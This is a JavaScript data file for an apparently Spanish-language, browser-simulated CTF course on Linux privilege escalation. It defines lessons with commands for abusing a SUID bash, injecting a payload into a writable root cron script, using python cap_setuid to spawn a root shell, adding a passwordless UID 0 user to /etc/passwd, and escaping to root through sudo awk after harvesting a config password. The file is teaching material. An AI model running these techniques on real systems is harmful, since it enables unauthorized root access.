        { t: 'Localiza los SUID: <code>find / -perm -4000 -type f 2>/dev/null</code>', hint: 'find / -perm -4000 -type f 2>/dev/null', ok: (c) => /\/bash$/m.test(strip(c.r.out)) },
        { t: 'Hay un <code>bash</code> SUID. Confírmalo: <code>ls -l /usr/bin/bash</code> (verás la <code>s</code>).', hint: 'ls -l /usr/bin/bash', ok: (c) => /^ls\b/.test(c.line) && /rws/.test(c.r.out) },
        { t: 'Escala manteniendo privilegios: <code>/usr/bin/bash -p</code>', hint: '/usr/bin/bash -p', ok: root },
        { t: 'Compruébalo con <code>id</code> y recoge la bandera: <code>cat /root/root.txt</code>', hint: 'cat /root/root.txt', ok: (c) => okOut(c, /suid_r00t/) },
      ],
    },
    {
      id: 'esc-cron',
      level: 4,
      title: 'Un cron escribible',
      tag: 'cron',
      say: 'Recuerda el script de cron de root que podías editar. Le metemos nuestro propio código.',
      setup: box({
        cron: { script: '/opt/scripts/limpieza.sh', owner: 'root' },
        files: [
          { path: '/etc/crontab', content: '# m h dom mon dow user\tcommand\n* * * * * root /opt/scripts/limpieza.sh\n', owner: 'root' },
          { path: '/opt/scripts/limpieza.sh', content: '#!/bin/bash\nrm -f /tmp/*.tmp\n', owner: 'root', mode: 0o777 },
          { path: '/root/root.txt', content: 'cr0n_r00t\n', owner: 'root', mode: 0o600 },
        ],
      }),
      body: `
        <p>El script <code>/opt/scripts/limpieza.sh</code> lo ejecuta <b>root</b> cada minuto, y tú puedes
        <b>escribir</b> en él. Si le añades una orden, root la ejecutará por ti. El payload clásico: hacer una copia de
        <code>bash</code> con el bit SUID, para después abrir con ella una shell de root.</p>
        <div class="flow pipe">
          <span class="box">echo payload >> script</span><span class="arrow">→</span>
          <span class="box">cron (root) lo ejecuta</span><span class="arrow">→</span>
          <span class="box">bash SUID</span><span class="arrow">→</span>
          <span class="box">root</span>
        </div>
        <p>Payload: <code>cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash</code>. Al ejecutarlo root, crea un bash
        con SUID root; luego <code>/tmp/rootbash -p</code> te da la shell.</p>`,
      steps: [
        { t: 'Mete tu payload en el script: <code>echo \'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\' >> /opt/scripts/limpieza.sh</code>', hint: "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/limpieza.sh", ok: (c) => reads(c, '/opt/scripts/limpieza.sh', 'rootbash') },
        { t: 'Espera a que el cron (root) lo ejecute y comprueba que apareció tu bash SUID: <code>ls -l /tmp/rootbash</code>', hint: 'ls -l /tmp/rootbash', ok: (c) => /^ls\b/.test(c.line) && /rootbash/.test(c.r.out) && /rws/.test(c.r.out) },
        { t: 'Ábrelo manteniendo privilegios: <code>/tmp/rootbash -p</code>', hint: '/tmp/rootbash -p', ok: root },
        { t: 'Eres root. Recoge la bandera: <code>cat /root/root.txt</code>', hint: 'cat /root/root.txt', ok: (c) => okOut(c, /cr0n_r00t/) },
      ],
    },
    {
      id: 'esc-cap',
      level: 4,
      title: 'Capabilities',
      tag: 'cap_setuid',
      say: 'El python con cap_setuid que encontraste enumerando puede ponerse a sí mismo como root.',
      setup: (sh, fs) => {
        box({ caps: { '/usr/bin/python3': 'cap_setuid+ep' }, files: [{ path: '/root/root.txt', content: 'c4p_r00t\n', owner: 'root', mode: 0o600 }] })(sh, fs);
        sh.installed.add('python3');
      },
      body: `
        <p>Un binario con la capability <code>cap_setuid</code> puede cambiar su propio UID a 0 sin ser SUID. Si es
        <code>python3</code>, le pedimos que se ponga como root y lance una shell:</p>
        <p><code>python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code></p>
        <div class="anatomy">
          <span class="part a"><code>os.setuid(0)</code><small>conviértete en root…</small></span>
          <span class="sep">→</span>
          <span class="part d"><code>os.system("/bin/bash")</code><small>…y abre una shell</small></span>
        </div>
        <p>Es la gracia de las capabilities mal puestas: no necesitas sudo ni SUID, el propio intérprete se encarga.</p>`,
      steps: [
        { t: 'Confirma la capability: <code>getcap -r / 2>/dev/null</code>', hint: 'getcap -r / 2>/dev/null', ok: (c) => /python3 cap_setuid/.test(c.r.out) },
        { t: 'Escala con python: <code>python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'</code>', hint: 'python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'', ok: root },
        { t: 'Compruébalo con <code>id</code> y lee la bandera: <code>cat /root/root.txt</code>', hint: 'cat /root/root.txt', ok: (c) => okOut(c, /c4p_r00t/) },
      ],
    },
    {
      id: 'esc-passwd',
      level: 4,
      title: '/etc/passwd escribible',
      tag: 'UID 0',
      say: 'Si puedes escribir en /etc/passwd, te fabricas tu propio root y entras con su.',
      setup: box({ passwdMode: 0o666, files: [{ path: '/root/root.txt', content: 'p4sswd_r00t\n', owner: 'root', mode: 0o600 }] }),
      body: `
        <p><code>/etc/passwd</code> define los usuarios. El campo tercero es el <b>UID</b>: el <code>0</code> es root.
        Si el archivo es escribible, te añades una cuenta con UID 0 y ya tienes otro root.</p>
        <div class="anatomy">
          <span class="part"><code>hax</code><small>usuario</small></span>
          <span class="sep">:</span>
          <span class="part b"><code>(vacío)</code><small>sin contraseña</small></span>
          <span class="sep">:</span>
          <span class="part a"><code>0:0</code><small>UID y GID de root</small></span>
          <span class="sep">:</span>
          <span class="part c"><code>/bin/bash</code><small>shell</small></span>
        </div>
        <p>La línea <code>hax::0:0::/root:/bin/bash</code> crea un root sin contraseña. Luego <code>su hax</code> y, cuando
        pida contraseña, pulsas Intro.</p>`,
      steps: [
        { t: 'Confirma que puedes escribir: <code>ls -l /etc/passwd</code>', hint: 'ls -l /etc/passwd', ok: (c) => /^ls\b/.test(c.line) && /rw-rw-rw-/.test(c.r.out) },
        { t: 'Añade tu usuario con UID 0: <code>echo \'hax::0:0::/root:/bin/bash\' >> /etc/passwd</code>', hint: "echo 'hax::0:0::/root:/bin/bash' >> /etc/passwd", ok: (c) => reads(c, '/etc/passwd', 'hax::0:0') },
        { t: 'Conviértete en él (la cuenta no tiene contraseña): <code>su hax</code>', hint: 'su hax', pass: '', ok: root },
        { t: 'Eres root. Recoge la bandera: <code>cat /root/root.txt</code>', hint: 'cat /root/root.txt', ok: (c) => okOut(c, /p4sswd_r00t/) },
      ],
    },
    {
      id: 'asalto-final',
      level: 4,
      title: 'El asalto final',
      tag: 'Misión final',
      say: 'Una máquina nueva, de cero. De la web a root, tú solo. Esto es lo que has venido a aprender.',
      setup: box({
        users: [{ name: 'tomas', uid: 1000, pass: 'Gu1t4rra.88' }],
        sudoers: { tomas: [{ bin: '/usr/bin/awk', runas: 'root', nopasswd: true }] },
        files: [
          { path: '/var/www/user.txt', content: 'w3b_sh3ll\n', owner: 'www-data' },
          { path: '/var/www/html/config.inc.php', content: "<?php\n$user='tomas';\n$pass='Gu1t4rra.88';\n", owner: 'www-data' },
          { path: '/home/tomas/user.txt', content: 't0m4s_fl4g\n', owner: 'tomas', mode: 0o640 },
          { path: '/root/root.txt', content: 'EL_ASALTO_COMPLETO\n', owner: 'root', mode: 0o600 },
        ],
      }),
      body: `
        <p>Esto es un objetivo completo, como en un examen. Tienes una shell de <code>www-data</code> y nada más. El
        camino, que descubrirás tú, junta todo lo del curso:</p>
        <div class="flow pipe">
          <span class="box">foothold</span><span class="arrow">→</span>
          <span class="box">loot</span><span class="arrow">→</span>
          <span class="box">pivot</span><span class="arrow">→</span>
          <span class="box">sudo -l</span><span class="arrow">→</span>
          <span class="box">root</span>
        </div>
        <p>Sin pistas en el texto. Recuerda la rutina: ¿quién soy? → ¿qué credenciales hay? → pivotar → ¿qué me deja
        sudo? → escalar. Las dos banderas te esperan: <code>user.txt</code> y <code>root.txt</code>.</p>`,
      steps: [
        { t: 'Oriéntate: <code>id</code>', hint: 'id', ok: (c) => okOut(c, /www-data/) },
        { t: 'Recoge la bandera de usuario: <code>cat /var/www/user.txt</code>', hint: 'cat /var/www/user.txt', ok: (c) => okOut(c, /w3b_sh3ll/) },
        { t: 'Busca credenciales en la web: <code>grep -ri pass /var/www</code>', hint: 'grep -ri pass /var/www', ok: (c) => okOut(c, /Gu1t4rra/) },
        { t: 'Pivota a tomas (contraseña <code>Gu1t4rra.88</code>): <code>su tomas</code>', hint: 'su tomas', pass: 'Gu1t4rra.88', ok: (c) => as(c, 'tomas') },
        { t: 'Mira qué te deja sudo ahora: <code>sudo -l</code>', hint: 'sudo -l', ok: (c) => as(c, 'tomas') && okOut(c, /awk/) },
        { t: 'Escala a root con awk (GTFOBins): <code>sudo awk \'BEGIN{system("/bin/sh")}\'</code>', hint: 'sudo awk \'BEGIN{system("/bin/sh")}\'', ok: root },
        { t: 'Lee la bandera final: <code>cat /root/root.txt</code>', hint: 'cat /root/root.txt', ok: (c) => okOut(c, /ASALTO_COMPLETO/) },
      ],
    },

    /* ================= ZONA DE JUEGO ================= */
    { id: 'contrarreloj', title: 'Contrarreloj', tag: '75 segundos', mode: 'arcade', icon: '⏱', say: '75 segundos. Yo te pido un paso de la metodología y tú lo escribes. Ya tienes la shell.', steps: [] },
    { id: 'banderas', title: 'Caza de banderas', tag: '4 secretos', mode: 'ctf', icon: '🚩', say: 'Cuatro banderas en el servidor. Enumera bien: solo cuentan si las sacas en pocas líneas.', outro: 'whoami, grep, ls -la y env: la enumeración inicial, que es el 90% del trabajo.', steps: [] },
    { id: 'contrarreloj2', glevel: 2, title: 'Contrarreloj', tag: '75 segundos', mode: 'arcade', icon: '⏱', say: 'Enumeración a toda velocidad, más alguna escalada rápida.', steps: [] },
    { id: 'banderas2', glevel: 2, title: 'Caza de banderas', tag: '4 secretos', mode: 'ctf', icon: '🚩', say: 'Escondidas tras una buena enumeración: cron, SUID, escribibles e historiales.', outro: 'Has encontrado banderas en todos los rincones que mira un pentester. Nivel 2 dominado.', steps: [] },
    { id: 'contrarreloj3', glevel: 3, title: 'Contrarreloj', tag: '75 segundos', mode: 'arcade', icon: '⏱', say: 'Escaladas y pivoting contra el reloj. Cada reto, una máquina nueva.', steps: [] },
    { id: 'banderas3', glevel: 3, title: 'Caza de banderas', tag: '4 secretos', mode: 'ctf', icon: '🚩', say: 'Para estas hay que pivotar de usuario en usuario: contraseña, clave SSH y sudo -u.', outro: 'su, ssh con clave y sudo -u: ya sabes moverte de lado por una máquina. Nivel 3 dominado.', steps: [] },
    { id: 'contrarreloj4', glevel: 4, title: 'Contrarreloj', tag: '75 segundos', mode: 'arcade', icon: '⏱', say: 'Solo escaladas a root, una detrás de otra. El contrarreloj de los que ya saben.', steps: [] },
    { id: 'banderas4', glevel: 4, title: 'Caza de banderas', tag: '4 secretos', mode: 'ctf', icon: '🚩', say: 'Todas tras conseguir root. Encuentra el camino, escala y recógelas.', outro: 'De una shell de www-data a leer /etc/shadow. Has completado el curso: ahora, a un CTF de verdad.', steps: [] },
    {
      id: 'libre',
      title: 'Terminal libre',
      tag: 'A tu aire',
      mode: 'free',
      icon: '⌨',
      say: 'Sin reglas. Una máquina con varios caminos a root; pruébalos todos. Si la rompes, pulsa Reiniciar.',
      setup: box({
        users: [{ name: 'dev', uid: 1000, pass: 'devpass123' }],
        sudoers: { 'www-data': [{ bin: '/usr/bin/find', runas: 'root', nopasswd: true }] },
        suid: ['/usr/bin/bash'],
        caps: { '/usr/bin/python3': 'cap_setuid+ep' },
        files: [
          { path: '/var/www/html/config.php', content: "<?php $pass='devpass123';\n", owner: 'www-data' },
          { path: '/root/root.txt', content: 'laboratorio_libre\n', owner: 'root', mode: 0o600 },
        ],
      }),
      body: `
        <p>Una máquina de pruebas con <b>varios</b> caminos a root a la vez: un sudo con find, un bash SUID, una
        capability en python y una contraseña en un config. Explótalos todos.</p>
        <div class="cards">
          <div><code>sudo -l</code><small>¿qué me deja sudo?</small></div>
          <div><code>find / -perm -4000 2>/dev/null</code><small>SUID</small></div>
          <div><code>getcap -r / 2>/dev/null</code><small>capabilities</small></div>
          <div><code>grep -ri pass /var/www</code><small>credenciales</small></div>
          <div><code>su dev</code><small>pivotar</small></div>
          <div><code>cat /root/root.txt</code><small>la bandera, al final</small></div>
        </div>
        <p>Abre la <b>Chuleta</b> de arriba para ver todas las técnicas con su ejemplo.</p>`,
      steps: [],
    },
  ];
})(typeof window !== 'undefined' ? window : globalThis);
